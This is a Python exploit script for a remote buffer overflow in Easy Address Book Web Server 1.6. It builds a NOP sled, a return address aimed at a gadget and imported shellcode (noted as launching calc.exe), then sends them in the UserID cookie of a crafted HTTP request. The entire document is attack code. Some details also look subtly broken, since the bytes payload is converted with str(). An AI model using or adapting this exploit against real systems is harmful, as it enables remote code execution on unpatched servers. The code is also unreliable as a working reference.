#!/usr/bin/python
# Exploit Title: Easy Address Book Web Server 1.6 - USERID Remote Buffer Overflow 
# Version:       1.6
# Date:          2015-08-23
# Author:        Tracy Turben (tracyturben@gmail.com)
# Software Link: http://www.efssoft.com/
# Tested on:     Win7x32-EN,Win7x64-EN


from payload import buf
from struct import pack
import socket
import struct
def shell_attack(target_machine, target_port):
  
    host=target_machine
    port=target_port
    
    nopsled0 = b"A" * 80 

    EDX = pack(b'<L',0x1001AFB8) # 1001AFE0 - 28 = 1001AFB8  JG SHORT 1001AF91 to MOV EAX,EBX POP EBP POP EBX RETN Return to Shellcode   

    nopsled1=b"\x90" * 20

    extraroom = b"\x90" * 780 
    # windows/exec CMD=calc.exe 
    # Encoder: x86/shikata_ga_nai
    # bad characters '\x00\x0a\x0d'

   
    
    payload=nopsled0 + EDX + nopsled1 + buf + extraroom
    
    buffer="GET //addrbook.ghp? HTTP/1.1\r\n"
    buffer+="User-Agent: Mozilla/4.0\r\n"
    buffer+="Host:" + host + ":" + str(port) + "\r\n"
    buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer+="Accept-Language: en-us\r\n"
    buffer+="Accept-Encoding: gzip, deflate\r\n"
    buffer+="Referer: http://" + host + "/\r\n"
    buffer+="Cookie: SESSIONID=1337; UserID=" + str(payload) + "; PassWD=;\r\n"
    buffer+="Conection: Keep-Alive\r\n\r\n"
    buffer = bytes(buffer, 'utf-8')
  
    
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host, port))
        s.send(buffer)
       
    except:
      
        s.close()
        
   
    
    
   
    s.close()